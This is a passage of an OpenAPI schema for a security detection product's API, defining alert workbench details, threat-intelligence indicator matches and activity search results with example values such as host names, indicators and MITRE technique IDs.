            "items": {
              "type": "object",
              "properties": {
                "id": {
                  "type": "string",
                  "example": "5f52d1f1-53e7-411a-b74f-745ee81fa30b"
                },
                "name": {
                  "type": "string",
                  "example": "Possible SpearPhishing Email"
                },
                "matchedFilters": {
                  "type": "array",
                  "items": {
                    "type": "object",
                    "properties": {
                      "id": {
                        "type": "string",
                        "example": "ccf86fc1-688f-4131-a46f-1d7a6ee2f88e"
                      },
                      "name": {
                        "type": "string",
                        "example": "(T1192) Spearphishing Link"
                      },
                      "timestamp": {
                        "type": "string",
                        "example": "2019-08-02T04:00:01.000Z"
                      },
                      "mitreTechniques": {
                        "type": "array",
                        "items": {
                          "type": "string",
                          "example": "T1192"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "alertTriggerTimestamp": {
            "type": "string",
            "example": "2020-04-30T00:01:15.000Z"
          },
          "workbenchCompleteTimestamp": {
            "type": "string",
            "example": "2030-04-30T00:01:16Z"
          }
        }
      },
      "awb-SAEWorkbenchDetailsDataV2": {
        "type": "object",
        "properties": {
          "schemaVersion": {
            "type": "string",
            "description": "Schema version",
            "example": "1.0"
          },
          "workbenchId": {
            "type": "string",
            "description": "Workbench ID",
            "example": "WB-9002-20200427-0002"
          },
          "workbenchLink": {
            "type": "string",
            "description": "Workbench URL",
            "example": "https://THE_WORKBENCH_URL"
          },
          "alertProvider": {
            "type": "string",
            "description": "Alert provider",
            "example": "SAE"
          },
          "modelId": {
            "type": "string",
            "description": "ID of the detection model that triggered the alert",
            "example": "1ebd4f91-4b28-40b4-87f5-8defee4791d8"
          },
          "model": {
            "type": "string",
            "description": "Name of the detection model that triggered the alert",
            "example": "Possible APT Attack"
          },
          "modelType": {
            "type": "string",
            "description": "Type of the detection model that triggered the alert",
            "example": "preset, custom",
            "enum": [
              "preset",
              "custom"
            ]
          },
          "description": {
            "type": "string",
            "description": "Description of the detection model that triggered the alert",
            "example": "A backdoor was possibly implanted after a user received a possible spear phishing email message."
          },
          "score": {
            "type": "string",
            "description": "Overall severity assigned to the alert based on the severity of the matched detection model and the impact scope",
            "example": "63"
          },
          "modelSeverity": {
            "type": "string",
            "description": "low, medium, high, or critical",
            "example": "critical"
          },
          "impactScope": {
            "type": "array",
            "description": "Entities affected by the alert",
            "items": {
              "type": "object",
              "required": [
                "entityType",
                "entityValue",
                "entityId",
                "relatedEntities",
                "relatedIndicators",
                "customTags",
                "platformTags"
              ],
              "properties": {
                "entityType": {
                  "type": "string",
                  "description": "Impact scope entity type",
                  "example": "host",
                  "enum": [
                    "host",
                    "account",
                    "emailAddress",
                    "container",
                    "cloudIdentity"
                  ]
                },
                "entityValue": {
                  "description": "Affected entities within the company network.\n\nNote: 'entityValue' is an object when the value of 'entity' is \"host\"; string otherwise.\n",
                  "oneOf": [
                    {
                      "allOf": [
                        {
                          "type": "object",
                          "description": "Only applicable when the value of 'entityType' is `host`\n"
                        },
                        {
                          "$ref": "#/components/schemas/awb-workbenchDetailHostInfo"
                        }
                      ]
                    },
                    {
                      "type": "string",
                      "description": "Only applicable when the value of 'entityType' is `account`, `emailAddress`, `container` or `cloudIdentity`\n",
                      "example": "loki@jaguartm.onmicrosoft.com"
                    }
                  ]
                },
                "entityId": {
                  "description": "The identifier of an identity.\n\nSupported values:\n* The value of any of the following fields: `account`, `emailAddress`, `container`, `cloudIdentity`.\n* The primary key of `hostNode` (GUID > ips > name).\n",
                  "oneOf": [
                    {
                      "type": "string",
                      "example": "5257b401-2fd7-469c-94fa-39a4f11eb925"
                    },
                    {
                      "type": "array",
                      "description": "Entity id may be a set of IPs for some host-type entities.",
                      "items": {
                        "type": "string",
                        "example": "10.1.152.61"
                      }
                    }
                  ]
                },
                "managementScopeGroupId": {
                  "type": "string",
                  "description": "Group ID for management scope",
                  "example": "deadbeef-292e-42ae-86be-d2fef483a248"
                },
                "managementScopeInstanceId": {
                  "type": "string",
                  "description": "The instance ID for asset visibility scope",
                  "example": "1babc299-52de-44f4-a1d2-8a224f391eee"
                },
                "managementScopePartitionKey": {
                  "type": "string",
                  "description": "The partition key for asset visibility scope",
                  "example": "4c1850c0-8a2a-4637-9f88-6afbab54dd79"
                },
                "relatedEntities": {
                  "type": "array",
                  "description": "Related entities",
                  "items": {
                    "oneOf": [
                      {
                        "type": "string",
                        "example": "CODERED\\\\loki"
                      },
                      {
                        "type": "array",
                        "items": {
                          "type": "string",
                          "example": "10.1.152.61"
                        }
                      }
                    ]
                  }
                },
                "relatedIndicators": {
                  "type": "array",
                  "items": {
                    "type": "integer",
                    "example": 1
                  }
                },
                "customTags": {
                  "description": "The custom tags for asset impact scope",
                  "type": "array",
                  "items": {
                    "type": "object",
                    "properties": {
                      "key": {
                        "type": "string",
                        "description": "The label of the custom tag",
                        "example": "Department"
                      },
                      "value": {
                        "description": "The value of the custom tag",
                        "type": "string",
                        "example": "finance"
                      }
                    }
                  }
                },
                "platformTags": {
                  "description": "The list of platform tags for asset impact scope",
                  "type": "array",
                  "items": {
                    "type": "object",
                    "properties": {
                      "key": {
                        "type": "string",
                        "description": "The label of the platform tag",
                        "example": "Asset group"
                      },
                      "value": {
                        "description": "The value of the platform tag",
                        "type": "string",
                        "example": "eu"
                      }
                    }
                  }
                }
              }
            }
          },
          "indicators": {
            "type": "array",
            "description": "The indicators refer to those objects which are found by RCA or sweeping",
            "items": {
              "type": "object",
              "properties": {
                "id": {
                  "type": "integer",
                  "example": 1
                },
                "objectType": {
                  "type": "string",
                  "example": "url"
                },
                "objectField": {
                  "type": "string",
                  "description": "Detailed description of the indicator",
                  "example": "request"
                },
                "objectValue": {
                  "oneOf": [
                    {
                      "type": "string",
                      "example": "http://www.DVftYKDtEi.com/ds7002.zip"
                    },
                    {
                      "type": "object",
                      "properties": {
                        "name": {
                          "type": "string",
                          "example": "CODERED\\\\bonus-PC"
                        },
                        "ips": {
                          "type": "array",
                          "items": {
                            "type": "string",
                            "example": "10.110.2.1"
                          }
                        },
                        "guid": {
                          "type": "string",
                          "example": "5257b401-2fd7-469c-94fa-39a4f11eb925"
                        }
                      }
                    }
                  ]
                },
                "relatedEntities": {
                  "type": "array",
                  "description": "Related entities",
                  "items": {
                    "oneOf": [
                      {
                        "type": "string",
                        "example": "loki@jaguartm.onmicrosoft.com"
                      },
                      {
                        "type": "array",
                        "items": {
                          "type": "string",
                          "example": "10.1.152.61"
                        }
                      }
                    ]
                  }
                },
                "filterId": {
                  "type": "array",
                  "items": {
                    "type": "string",
                    "example": "f862df72-7f5e-4b2b-9f7f-9148e875f908"
                  }
                }
              }
            }
          },
          "matchedRules": {
            "type": "array",
            "description": "The rules are triggered",
            "items": {
              "type": "object",
              "properties": {
                "id": {
                  "type": "string",
                  "example": "5f52d1f1-53e7-411a-b74f-745ee81fa30b"
                },
                "name": {
                  "type": "string",
                  "example": "Possible SpearPhishing Email"
                },
                "matchedFilters": {
                  "type": "array",
                  "items": {
                    "type": "object",
                    "properties": {
                      "id": {
                        "type": "string",
                        "example": "ccf86fc1-688f-4131-a46f-1d7a6ee2f88e"
                      },
                      "name": {
                        "type": "string",
                        "example": "(T1192) Spearphishing Link"
                      },
                      "timestamp": {
                        "type": "string",
                        "example": "2019-08-02T04:00:01.000Z"
                      },
                      "mitreTechniques": {
                        "type": "array",
                        "items": {
                          "type": "string",
                          "example": "T1192"
                        }
                      },
                      "matchedEvents": {
                        "type": "array",
                        "items": {
                          "type": "object",
                          "properties": {
                            "uuid": {
                              "type": "string",
                              "example": "fa9ff47c-e1b8-459e-a3d0-a5b104b854a5"
                            },
                            "timestamp": {
                              "type": "string",
                              "example": "2019-08-02T04:00:01.000Z"
                            },
                            "type": {
                              "type": "string",
                              "description": "Prefix that indicates the data source of a field. Possible values:\n  * TELEMETRY_ : Endpoint activity data\n  * PRODUCT_ : Detections\n  * JAGUAR_ : Detections\n  * MESSAGE_ : Message activity data\n",
                              "enum": [
                                "TELEMETRY_ACCOUNT",
                                "TELEMETRY_AMSI",
                                "TELEMETRY_CONNECTION",
                                "TELEMETRY_DNS",
                                "TELEMETRY_FILE",
                                "TELEMETRY_INTERNET",
                                "TELEMETRY_PROCESS",
                                "TELEMETRY_REGISTRY",
                                "TELEMETRY_MODIFIED_PROCESS",
                                "TELEMETRY_WINDOWS_EVENT",
                                "TELEMETRY_WINDOWS_HOOK",
                                "TELEMETRY_WMI",
                                "TELEMETRY_MEMORY",
                                "TELEMETRY_BM",
                                "TELEMETRY_APP",
                                "TELEMETRY_SYSTEM_EVENT",
                                "PRODUCT_JAGUAR",
                                "PRODUCT_EVENT_LOG",
                                "JAGUAR_ACTIVITY_DNA",
                                "JAGUAR_ACTIVITY_PTE",
                                "MESSAGE_EMAIL_META",
                                "NETWORK_ACTIVITY"
                              ],
                              "example": "TELEMETRY_REGISTRY"
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "alertTriggerTimestamp": {
            "type": "string",
            "example": "2020-04-30T00:01:15.000Z"
          },
          "workbenchCompleteTimestamp": {
            "type": "string",
            "example": "2030-04-30T00:01:16Z"
          }
        }
      },
      "awb-TIWorkbenchDetailsData": {
        "type": "object",
        "properties": {
          "schemaVersion": {
            "type": "string",
            "description": "Schema version",
            "example": "1.1"
          },
          "workbenchId": {
            "type": "string",
            "description": "Workbench ID",
            "example": "WB-9002-20200427-0002"
          },
          "workbenchLink": {
            "type": "string",
            "description": "Workbench URL",
            "example": "https://THE_WORKBENCH_URL"
          },
          "alertProvider": {
            "type": "string",
            "description": "Alert provider",
            "example": "TI"
          },
          "model": {
            "type": "string",
            "description": "TI alert model",
            "example": "Desktop, Mobile Phishing Campaign Targets South Korean Websites, Steals Credentials Via Watering Hole"
          },
          "score": {
            "type": "string",
            "description": "Suspicious attack score",
            "example": 63
          },
          "campaign": {
            "type": "string",
            "description": "If this field has no value, it will show n/a here",
            "example": "Soula"
          },
          "industry": {
            "type": "string",
            "description": "If this field has no value, it will show n/a here",
            "example": "n/a"
          },
          "region/country": {
            "type": "string",
            "description": "If this field has no value, it will show n/a here",
            "example": "eastern-asia/Korea (the Republic of)"
          },
          "modelSeverity": {
            "type": "string",
            "description": "Could be low, medium, high or critical",
            "example": "critical"
          },
          "createdBy": {
            "type": "string",
            "description": null,
            "example": "Trend Micro Research"
          },
          "totalIndicatorNumber": {
            "type": "integer",
            "description": null,
            "example": 6
          },
          "matchedIndicatorNumber": {
            "type": "integer",
            "description": null,
            "example": 2
          },
          "reportLink": {
            "type": "string",
            "description": null,
            "example": "https://THE_WORKBENCH_URL"
          },
          "impactScope": {
            "type": "array",
            "description": "The entity that was impacted",
            "items": {
              "type": "object",
              "properties": {
                "entityType": {
                  "type": "string",
                  "description": "It can only be a host now",
                  "example": "host"
                },
                "entityValue": {
                  "type": "object",
                  "properties": {
                    "name": {
                      "type": "string",
                      "example": "CODERED\\\\bonus-PC"
                    },
                    "ips": {
                      "type": "array",
                      "items": {
                        "type": "string",
                        "example": "10.110.2.1"
                      }
                    },
                    "guid": {
                      "type": "string",
                      "example": "5257b401-2fd7-469c-94fa-39a4f11eb925"
                    }
                  },
                  "example": {
                    "name": "CODERED\\\\bonus-PC",
                    "ips": [
                      "10.110.2.1",
                      "10.112.87.0"
                    ],
                    "guid": "5257b401-2fd7-469c-94fa-39a4f11eb925"
                  }
                },
                "entityId": {
                  "oneOf": [
                    {
                      "type": "string",
                      "example": "5257b401-2fd7-469c-94fa-39a4f11eb925"
                    },
                    {
                      "type": "array",
                      "items": {
                        "type": "string",
                        "example": "10.110.2.1"
                      }
                    }
                  ]
                },
                "managementScopeGroupId": {
                  "type": "string",
                  "description": "Group ID for management scope",
                  "example": "deadbeef-292e-42ae-86be-d2fef483a248"
                },
                "managementScopeInstanceId": {
                  "type": "string",
                  "description": "The instance ID for asset visibility scope",
                  "example": "1babc299-52de-44f4-a1d2-8a224f391eee"
                },
                "managementScopePartitionKey": {
                  "type": "string",
                  "description": "The partition key for asset visibility scope",
                  "example": "4c1850c0-8a2a-4637-9f88-6afbab54dd79"
                },
                "relatedEntities": {
                  "type": "array",
                  "items": {
                    "oneOf": [
                      {
                        "type": "string",
                        "example": "4257b401-2fd7-469c-94fa-39a4f11eb925"
                      },
                      {
                        "type": "array",
                        "items": {
                          "type": "string",
                          "example": "10.1.152.61"
                        }
                      }
                    ]
                  }
                },
                "relatedIndicators": {
                  "type": "array",
                  "items": {
                    "type": "integer",
                    "example": 1
                  }
                },
                "customTags": {
                  "description": "The custom tags for asset impact scope",
                  "type": "array",
                  "items": {
                    "type": "object",
                    "properties": {
                      "key": {
                        "type": "string",
                        "description": "The label of the custom tag",
                        "example": "Department"
                      },
                      "value": {
                        "description": "The value of the custom tag",
                        "type": "string",
                        "example": "finance"
                      }
                    }
                  }
                },
                "platformTags": {
                  "description": "The list of platform tags for asset impact scope",
                  "type": "array",
                  "items": {
                    "type": "object",
                    "properties": {
                      "key": {
                        "type": "string",
                        "description": "The label of the platform tag",
                        "example": "Asset group"
                      },
                      "value": {
                        "description": "The value of the customizable platform tag",
                        "type": "string",
                        "example": "eu"
                      }
                    }
                  }
                }
              }
            }
          },
          "indicators": {
            "type": "array",
            "description": "The indicators refer to those objects which are found by RCA or sweeping",
            "items": {
              "type": "object",
              "properties": {
                "id": {
                  "type": "integer",
                  "example": 1
                },
                "objectType": {
                  "type": "string",
                  "example": "url"
                },
                "objectValue": {
                  "oneOf": [
                    {
                      "type": "string",
                      "example": "http://www.DVftYKDtEi.com/ds7002.zip"
                    },
                    {
                      "type": "object",
                      "properties": {
                        "name": {
                          "type": "string",
                          "example": "CODERED\\\\bonus-PC"
                        },
                        "ips": {
                          "type": "array",
                          "items": {
                            "type": "string",
                            "example": "10.110.2.1"
                          }
                        },
                        "guid": {
                          "type": "string",
                          "example": "5257b401-2fd7-469c-94fa-39a4f11eb925"
                        }
                      }
                    }
                  ]
                },
                "relatedEntities": {
                  "type": "array",
                  "items": {
                    "oneOf": [
                      {
                        "type": "string",
                        "example": "5257b401-2fd7-469c-94fa-39a4f11eb925"
                      },
                      {
                        "type": "array",
                        "items": {
                          "type": "string",
                          "example": "10.1.152.61"
                        }
                      }
                    ]
                  }
                },
                "matchedIndicatorPatterns": {
                  "type": "array",
                  "items": {
                    "type": "string",
                    "example": "74f7eb0f-1ca3-491a-b4cf-f4d54c83c87d"
                  }
                },
                "firstSeen": {
                  "type": "array",
                  "items": {
                    "type": "string",
                    "example": "2019-06-14T18:25:55.000Z"
                  }
                },
                "lastSeen": {
                  "type": "array",
                  "items": {
                    "type": "string",
                    "example": "2019-06-14T18:25:55.000Z"
                  }
                }
              }
            }
          },
          "matchedIndicatorPatterns": {
            "type": "array",
            "description": "The matched indicator patterns",
            "items": {
              "type": "object",
              "properties": {
                "id": {
                  "type": "string",
                  "example": "74f7eb0f-1ca3-491a-b4cf-f4d54c83c87d"
                },
                "pattern": {
                  "type": "string",
                  "example": "[network-traffic:dst_ref.type = 'domain-name' AND network-traffic:dst_ref.value = 'oauth20.xyz']"
                },
                "tags": {
                  "type": "array",
                  "items": {
                    "type": "string",
                    "example": "STIX2.malicious-activity"
                  }
                },
                "matchedLogs": {
                  "type": "array",
                  "items": {
                    "type": "string",
                    "example": "Lengthy log string"
                  }
                }
              }
            }
          },
          "alertTriggerTimestamp": {
            "type": "string",
            "example": "2020-04-30T00:01:15.000Z"
          },
          "workbenchCompleteTimestamp": {
            "type": "string",
            "example": "2030-04-30T00:01:16Z"
          }
        }
      },
      "awb-TIWorkbenchDetailsDataV2": {
        "type": "object",
        "properties": {
          "schemaVersion": {
            "type": "string",
            "description": "Schema version",
            "example": "1.1"
          },
          "workbenchId": {
            "type": "string",
            "description": "Workbench ID",
            "example": "WB-9002-20200427-0002"
          },
          "workbenchLink": {
            "type": "string",
            "description": "Workbench URL",
            "example": "https://THE_WORKBENCH_URL"
          },
          "alertProvider": {
            "type": "string",
            "description": "Alert provider",
            "example": "TI"
          },
          "modelId": {
            "type": "string",
            "description": "ID of the detection model that triggered the alert",
            "example": "report--12ea4e6c-2b13-44e4-94a9-4cc8da461258"
          },
          "model": {
            "type": "string",
            "description": "TI alert model",
            "example": "Desktop, Mobile Phishing Campaign Targets South Korean Websites, Steals Credentials Via Watering Hole"
          },
          "modelType": {
            "type": "string",
            "description": "Type of the detection model that triggered the alert",
            "example": "preset, custom",
            "enum": [
              "preset",
              "custom"
            ]
          },
          "score": {
            "type": "string",
            "description": "Suspicious attack score",
            "example": 63
          },
          "campaign": {
            "type": "string",
            "description": "If this field has no value, it will show n/a here",
            "example": "Soula"
          },
          "industry": {
            "type": "string",
            "description": "If this field has no value, it will show n/a here",
            "example": "n/a"
          },
          "region/country": {
            "type": "string",
            "description": "If this field has no value, it will show n/a here",
            "example": "eastern-asia/Korea (the Republic of)"
          },
          "modelSeverity": {
            "type": "string",
            "description": "Could be low, medium, high or critical",
            "example": "critical"
          },
          "createdBy": {
            "type": "string",
            "description": null,
            "example": "Trend Micro Research"
          },
          "totalIndicatorNumber": {
            "type": "integer",
            "description": null,
            "example": 6
          },
          "matchedIndicatorNumber": {
            "type": "integer",
            "description": null,
            "example": 2
          },
          "reportLink": {
            "type": "string",
            "description": null,
            "example": "https://THE_WORKBENCH_URL"
          },
          "impactScope": {
            "type": "array",
            "description": "The entity that was impacted",
            "items": {
              "type": "object",
              "required": [
                "entityType",
                "entityValue",
                "entityId",
                "relatedEntities",
                "relatedIndicators"
              ],
              "properties": {
                "entityType": {
                  "type": "string",
                  "description": "Impact scope entity type",
                  "example": "host",
                  "enum": [
                    "host",
                    "account",
                    "emailAddress",
                    "container",
                    "cloudIdentity"
                  ]
                },
                "entityValue": {
                  "description": "Affected entities within the company network.\n\nSupported values:\n* The value of any of the following fields: `account`, `emailAddress`, `container`, `cloudIdentity`.\n* The primary key of `hostNode` (GUID > ips > name).\n\nNote: 'entityValue' is an object when the value of 'entity' is \"host\"; string otherwise.\n",
                  "oneOf": [
                    {
                      "type": "string",
                      "example": "loki@jaguartm.onmicrosoft.com"
                    },
                    {
                      "$ref": "#/components/schemas/awb-workbenchDetailHostInfo"
                    }
                  ]
                },
                "entityId": {
                  "description": "The identifier of an identity.\n\nSupported values:\n* The value of any of the following fields: `account`, `emailAddress`, `container`, `cloudIdentity`.\n* The primary key of `hostNode` (GUID > ips > name).\n",
                  "oneOf": [
                    {
                      "type": "string",
                      "example": "5257b401-2fd7-469c-94fa-39a4f11eb925"
                    },
                    {
                      "type": "array",
                      "description": "Entity id may be a set of IPs for some host-type entities.",
                      "items": {
                        "type": "string",
                        "example": "10.1.152.61"
                      }
                    }
                  ]
                },
                "managementScopeGroupId": {
                  "type": "string",
                  "description": "Group ID for management scope",
                  "example": "deadbeef-292e-42ae-86be-d2fef483a248"
                },
                "managementScopeInstanceId": {
                  "type": "string",
                  "description": "The instance ID for asset visibility scope",
                  "example": "1babc299-52de-44f4-a1d2-8a224f391eee"
                },
                "managementScopePartitionKey": {
                  "type": "string",
                  "description": "The partition key for asset visibility scope",
                  "example": "4c1850c0-8a2a-4637-9f88-6afbab54dd79"
                },
                "relatedEntities": {
                  "type": "array",
                  "description": "Related entities",
                  "items": {
                    "oneOf": [
                      {
                        "type": "string",
                        "example": "CODERED\\\\loki"
                      },
                      {
                        "type": "array",
                        "items": {
                          "type": "string",
                          "example": "10.1.152.61"
                        }
                      }
                    ]
                  }
                },
                "relatedIndicators": {
                  "type": "array",
                  "items": {
                    "type": "integer",
                    "example": 1
                  }
                },
                "customTags": {
                  "description": "The custom tags for asset impact scope",
                  "type": "array",
                  "items": {
                    "type": "object",
                    "properties": {
                      "key": {
                        "type": "string",
                        "description": "The label of the custom tag",
                        "example": "Department"
                      },
                      "value": {
                        "description": "The value of the custom tag",
                        "type": "string",
                        "example": "finance"
                      }
                    }
                  }
                },
                "platformTags": {
                  "description": "The list of platform tags for asset impact scope",
                  "type": "array",
                  "items": {
                    "type": "object",
                    "properties": {
                      "key": {
                        "type": "string",
                        "description": "The label of the platform tag",
                        "example": "Asset group"
                      },
                      "value": {
                        "description": "The value of the customizable platform tag",
                        "type": "string",
                        "example": "eu"
                      }
                    }
                  }
                }
              }
            }
          },
          "indicators": {
            "type": "array",
            "description": "The indicators refer to those objects which are found by RCA or sweeping",
            "items": {
              "type": "object",
              "properties": {
                "id": {
                  "type": "integer",
                  "example": 1
                },
                "objectType": {
                  "type": "string",
                  "example": "url"
                },
                "objectFields": {
                  "description": "Array that contains detailed information about an indicator.",
                  "type": "array",
                  "items": {
                    "type": "array",
                    "items": {
                      "type": "string",
                      "description": "Fields",
                      "example": "request"
                    }
                  }
                },
                "objectValue": {
                  "oneOf": [
                    {
                      "type": "string",
                      "example": "http://www.DVftYKDtEi.com/ds7002.zip"
                    },
                    {
                      "type": "object",
                      "properties": {
                        "name": {
                          "type": "string",
                          "example": "CODERED\\\\bonus-PC"
                        },
                        "ips": {
                          "type": "array",
                          "items": {
                            "type": "string",
                            "example": "10.110.2.1"
                          }
                        },
                        "guid": {
                          "type": "string",
                          "example": "5257b401-2fd7-469c-94fa-39a4f11eb925"
                        }
                      }
                    }
                  ]
                },
                "relatedEntities": {
                  "type": "array",
                  "description": "Related entities",
                  "items": {
                    "oneOf": [
                      {
                        "type": "string",
                        "example": "loki@jaguartm.onmicrosoft.com"
                      },
                      {
                        "type": "array",
                        "items": {
                          "type": "string",
                          "example": "10.1.152.61"
                        }
                      }
                    ]
                  }
                },
                "matchedIndicatorPatterns": {
                  "type": "array",
                  "items": {
                    "type": "string",
                    "example": "74f7eb0f-1ca3-491a-b4cf-f4d54c83c87d"
                  }
                },
                "firstSeen": {
                  "type": "array",
                  "items": {
                    "type": "string",
                    "example": "2019-06-14T18:25:55.000Z"
                  }
                },
                "lastSeen": {
                  "type": "array",
                  "items": {
                    "type": "string",
                    "example": "2019-06-14T18:25:55.000Z"
                  }
                }
              }
            }
          },
          "matchedIndicatorPatterns": {
            "type": "array",
            "description": "The matched indicator patterns",
            "items": {
              "type": "object",
              "properties": {
                "id": {
                  "type": "string",
                  "example": "74f7eb0f-1ca3-491a-b4cf-f4d54c83c87d"
                },
                "pattern": {
                  "type": "string",
                  "example": "[network-traffic:dst_ref.type = 'domain-name' AND network-traffic:dst_ref.value = 'oauth20.xyz']"
                },
                "tags": {
                  "type": "array",
                  "items": {
                    "type": "string",
                    "example": "STIX2.malicious-activity"
                  }
                },
                "matchedLogs": {
                  "type": "array",
                  "items": {
                    "type": "string",
                    "example": "Lengthy log string"
                  }
                }
              }
            }
          },
          "alertTriggerTimestamp": {
            "type": "string",
            "example": "2020-04-30T00:01:15.000Z"
          },
          "workbenchCompleteTimestamp": {
            "type": "string",
            "example": "2030-04-30T00:01:16Z"
          }
        }
      },
      "ase-SearchResults": {
        "type": "object",
        "properties": {
          "status": {
            "type": "integer",
            "description": "return code",
            "example": 200
          },
          "data": {
            "type": "object",
            "description": "datalake return list of key and its value note: search result matched result fields include not empty value of fields above at least, other fields need check real result.\n",
            "properties": {
              "offset": {
                "type": "integer",
                "description": "raw log document offset (default 0)",
                "example": 0
              },
              "total_count": {
                "type": "integer",
                "description": "The total count of matching resources.",
                "example": 3123
              },
              "logs": {
                "type": "array",
                "items": {
                  "anyOf": [
                    {
                      "$ref": "#/components/schemas/ase-messageActivityData"
                    },
                    {
                      "$ref": "#/components/schemas/ase-endpointActivityData"
                    },
                    {
                      "$ref": "#/components/schemas/ase-detectionsEndpointData"
                    },
                    {
                      "$ref": "#/components/schemas/ase-detectionsMailData"
                    },
                    {
                      "$ref": "#/components/schemas/ase-networkActivityData"
                    }
                  ],
                  "discriminator": {
                    "propertyName": "searchDL",
                    "mapping": {
                      "CAS": "#/components/schemas/ase-messageActivityData",
                      "SDL": "#/components/schemas/ase-endpointActivityData",
                      "DDL": "#/components/schemas/ase-detectionsEndpointData",
                      "NDL": "#/components/schemas/ase-networkActivityData"
                    }
                  }
                }
              }
            }
          }
        }
      },
      "ase-SearchDetectionsResults": {
        "type": "object",
        "properties": {
          "data": {
            "type": "object",
            "description": "datalake return list of key and its value note: search result matched result fields include not empty value of fields above at least, other fields need check real result.\n",
            "properties": {
              "offset": {
                "type": "integer",
                "description": "raw log document offset (default 0)",
                "example": 0
              },
              "total_count": {
                "type": "integer",
                "description": "The total count of matching resources.",
                "example": 3123
              },
              "logs": {
                "type": "array",
                "items": {
                  "anyOf": [
                    {
                      "$ref": "#/components/schemas/ase-detectionsEndpointData"
                    },
                    {
                      "$ref": "#/components/schemas/ase-detectionsMailData"
                    }
                  ]
                }
              }
            }
          }
        }
      },
      "ase-messageActivityData": {
        "type": "object",
        "additionalProperties": true,
        "properties": {
          "mail_attachments": {
            "type": "array",
            "description": "Information about each attachment file in the email message",
            "items": {
              "type": "object",
              "properties": {
                "file_sha1": {
                  "type": "string",
                  "example": "34924b49e416befd1106cad406d413e6e4a89563",
                  "description": "SHA-1 hash value of the attachment file"
                },
                "file_name": {
                  "type": "string",
                  "example": "test.txt",
                  "description": "Name of the attachment file"
                }
              }
            }
          },
          "mail_message_subject": {
            "type": "string",
            "example": "test sample",
            "description": "Subject of the email message"
          },
          "mail_urls": {
            "type": "array",
            "example": [
              "http://www.google.com"
            ],
            "description": "URL(s) contained in the email body or attachment",
            "items": {
              "type": "string"
            }
          },
          "mail_message_id": {
            "type": "string",
            "example": "<BL0PR01MB4178833793C138CE3414D53B997A0@BL0PR01MB4178.prod.example.com>",
            "description": "Internet message ID of the email message"
          },
          "mail_unique_id": {
            "type": "string",
            "example": "AAMkAGRhODQyZDAzLWNmNjEtNDY2OS1iOWM3LWVmODUxMDk4ZjE1ZgBGAAAAAAABcyFCsOdnTohKgA0TJdjUBwAYbtU+cD0jRZmfu0kuMtvEAAAAAAEMAAAYbtU+cD0jRZmfu0kuMtvEAAF/JGRaAAA=",
            "description": "Unique ID of the email message"
          },
          "mailbox": {
            "type": "string",
            "example": "user2@example2.com",
            "description": "Mailbox where the email message is"
          },
          "source_ip": {
            "type": "string",
            "example": "xx.yy.zz.ww",
            "description": "Source IP address of the email message"
          },
          "mail_message_sender": {
            "type": "string",
            "example": "user3@example3.com",
            "description": "Sender email address of the email message"
          },
          "mail_internet_headers": {
            "type": "array",
            "description": "Information about the Internet header of the email message",
            "items": {
              "type": "object",
              "properties": {
                "Value": {
                  "type": "string",
                  "example": "user3@example3.com",
                  "description": "Sender email address of the email message"
                },
                "HeaderName": {
                  "type": "string",
                  "example": "Return-Path",
                  "description": "Internet header name of the email address"
                }
              }
            }
          },
          "mail_message_recipient": {
            "type": "array",
            "description": "A list of recipient email addresses of the email message",
            "example": [
              "user2@example2.com"
            ],
            "items": {
              "type": "string"
            }
          },
          "source_domain": {
            "type": "string",
            "example": "example3.com",
            "description": "Source domain of the email message"
          },
          "mail_message_delivery_time": {
            "type": "string",
            "example": "2019-02-25T08:42:45.000Z",
            "description": "Date and time when the email message was sent"
          },
          "searchDL": {
            "type": "string",
            "example": "CAS",
            "description": "Search data lake"
          },
          "service": {
            "type": "string",
            "example": "exchange"
          },
          "eventTime": {
            "type": "integer",
            "example": 1601249307000,
            "description": "Date and time UTC"
          },
          "org_id": {
            "type": "string",
            "example": "8d23a000-9a4c-11ea-80f5-1de879102030",
            "description": "Unique ID used to identify an organization"
          }
        }
      },
      "ase-endpointActivityData": {
        "type": "object",
        "additionalProperties": true,
        "properties": {
          "dpt": {
            "type": "integer",
            "nullable": true,
            "example": 443,
            "description": "Destination port"
          },
          "dst": {
            "type": "string",
            "example": "",
            "description": "Destination IP address"
          },
          "endpointGuid": {
            "type": "string",
            "example": "72436165-b5a5-471a-9389-0bdc3647bc33",
            "description": "GUID"
          },
          "endpointHostName": {
            "type": "string",
            "example": "xxx-docker",
            "description": "Hostname of the endpoint on which the event was generated"
          },
          "endpointIp": {
            "type": "array",
            "items": {
              "type": "string"
            },
            "example": [
              "192.0.2.0"
            ],
            "description": "Endpoint IP address"
          },
          "eventId": {
            "type": "integer"
          },
          "eventSubId": {
            "type": "integer"
          },
          "eventTime": {
            "type": "integer",
            "example": 1633124154241
          },
          "eventTimeDT": {
            "type": "string",
            "example": "2021-10-01T21:35:54.241000+00:00"
          },
          "hostName": {
            "type": "string",
            "example": "xxx-docker",
            "description": "Hostname of the endpoint on which the event was generated"
          },
          "logonUser": {
            "type": "array",
            "nullable": true,
            "items": {
              "type": "string"
            }
          },
          "objectCmd": {
            "type": "string",
            "example": "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe --type=utility --lang=en-US --no-sandbox",
            "description": "The command line that a process detected by Attack Discovery uses to execute other processes"
          },
          "objectFileHashSha1": {
            "type": "string",
            "example": "98A9A1C8F69373B211E5F1E303BA8762F44BC898",
            "description": "File hash detected by Attack Discovery"
          },
          "objectFilePath": {
            "type": "string",
            "example": "C:\\Program Files (x86)\\temp\\Application\\test.exe"
          },
          "objectHostName": {
            "type": "string"
          },
          "objectIp": {
            "type": "string"
          },
          "objectIps": {
            "type": "array",
            "items": {
              "type": "string"
            }
          },
          "objectPort": {
            "type": "integer",
            "nullable": true
          },
          "objectRegistryData": {
            "type": "string",
            "example": "wscript \"C:\\Program Files (x86)\\JNJ\\ITS_IE_PREF\\IE_Preferences.vbs\""
          },
          "objectRegistryKeyHandle": {
            "type": "string",
            "example": "hklm\\software\\wow6432node\\microsoft\\windows\\currentversion\\run"
          },
          "objectRegistryValue": {
            "type": "string",
            "example": "its_ie_settings"
          },
          "objectSigner": {
            "type": "array",
            "nullable": true,
            "example": [
              "Microsoft Windows"
            ],
            "items": {
              "type": "string"
            }
          },
          "objectSignerValid": {
            "type": "array",
            "nullable": true,
            "items": {
              "type": "boolean"
            }
          },
          "objectUser": {
            "type": "string",
            "example": "SYSTEM"
          },
          "os": {
            "type": "string",
            "example": "Linux",
            "description": "SYSTEM"
